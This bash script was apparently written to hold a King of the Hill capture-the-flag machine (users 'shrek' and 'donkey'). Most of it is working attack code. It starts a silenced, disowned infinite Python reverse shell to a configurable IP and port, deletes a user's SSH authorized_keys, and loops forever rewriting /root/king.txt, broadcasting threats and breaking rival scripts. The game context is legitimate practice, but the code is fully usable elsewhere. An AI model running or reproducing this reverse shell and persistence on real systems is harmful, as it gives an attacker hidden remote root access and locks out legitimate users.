# A script to get some shit done
# Author : Cipher 
# github: https://github.com/Cipher7
# discord: Cipher007#1099


NAME=Cipher007  #change this
IP=10.10.10.10.    #change this
PORT=4444       #change this

echo "Created by Cipher007!"
echo "Discord:Cipher007#1099"


echo "There are 5 flags in this machine. Find them."
echo "Command : find / -name "*flag*" 2>/dev/null"

# Infinite Reverse shell
while [ 1 ]; do
	python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('${IP}',${PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);" &> /dev/null
done &
disown

echo "Donkey has access to tar without password! Patch that to prevent him from doing any privesc!"
echo "Edit the /etc/sudoers file using vim!"

echo "There is also a telnetd file in one of the users directory! Edit that to prevent people from leveraging a shell using that!"
count=1

rm /home/shrek/.ssh/authorized_keys

while [ 1 ]; do
	LOG=$(cat /root/king.txt)
	if [[ $LOG != $NAME ]]; then
		echo "[*] modification observed."
		echo $NAME > /root/king.txt #puts your username back into the file
		echo "[+] got shit fixed! nothing to worry about!"
		let 'count+=1'
	fi

	if [ $count -eq 4 ]; then
		wall -n "What is going on? Stay outta here or face the consequences!"     #asking him to stay out! not politely though!
		echo "[*] $count changes made in king.txt! Find this dude immediately!"
		let 'count+=1'
	fi
	
	if [ $count -eq 10 ]; then
		echo "There may be another script running which is colliding with this script's functionality! Trying to break the script!"
		rm /root/king.txt
		sleep 2
		echo $NAME > /root/king.txt 
		if [[ $LOG == $NAME ]]; then
			echo "The opponent's script has been broken!"
		fi
		let 'count+=1'
	fi
	if [ $count -eq 20 ]; then
		echo "That script is either not dead yet or this dude is seriously jobless! Find it and kill it. Use ' ps aux ' to list all procesess"
		let 'count+=1'
	fi

done

